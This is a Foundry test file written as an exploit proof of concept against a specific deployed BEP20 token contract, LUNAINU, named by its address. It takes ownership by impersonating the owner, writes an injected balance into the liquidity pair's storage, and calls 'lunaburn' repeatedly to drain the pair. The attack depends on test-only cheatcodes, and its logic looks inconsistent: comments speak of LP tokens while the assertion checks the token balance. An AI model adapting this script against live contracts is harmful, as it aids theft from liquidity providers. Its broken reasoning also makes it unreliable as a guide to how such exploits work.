// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function pair() external view returns (address);
    function lunaburn(uint256 percent_base1000) external;
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU target;
    address owner;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = BEP20LUNAINU(TARGET);
        owner = target.getOwner();
        pair = target.pair();
        vm.label(owner, "Owner");
        vm.label(pair, "LP Pair");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = target.balanceOf(attacker);

        // Step 1: Owner transfers ownership to attacker
        vm.startPrank(owner);
        target.transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 2: Attacker accepts ownership
        target.acceptOwnership();

        // Step 3: Inject LUNAINU tokens into pair's balance using vm.store
        // balanceOf mapping is at slot 0, compute slot as keccak256(abi.encode(pair, 0))
        bytes32 pairBalanceSlot = keccak256(abi.encode(pair, uint256(0)));
        uint256 tokensToInject = 1000000 * 1e9; // 1M tokens with 9 decimals
        vm.store(TARGET, pairBalanceSlot, bytes32(tokensToInject));

        // Step 4: Drain LP tokens from pair to attacker
        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        // Verify attacker gained LP tokens
        uint256 finalBalance = target.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker should have gained LP tokens");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

